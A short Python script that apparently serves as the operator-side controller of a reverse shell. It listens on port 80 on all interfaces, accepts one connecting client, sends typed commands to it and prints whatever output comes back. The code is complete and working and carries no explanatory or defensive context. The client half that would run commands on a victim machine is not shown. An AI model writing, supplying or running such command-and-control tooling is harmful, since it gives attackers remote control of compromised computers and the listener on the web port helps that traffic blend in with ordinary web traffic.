import socket

def run_controller():
    host = '0.0.0.0'
    port = 80
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"Waiting for client on port {port}...")
    
    conn, addr = server.accept()
    print(f"Connected to {addr}")
    
    with conn:
        while True:
            cmd = input("> ")
            if not cmd: continue
            
            conn.sendall(cmd.encode('utf-8'))
            if cmd.lower() == "exit": break
            
            result = conn.recv(4096).decode('utf-8')
            print(f"--- Client Output ---\n{result}")

if __name__ == "__main__":
    run_controller()
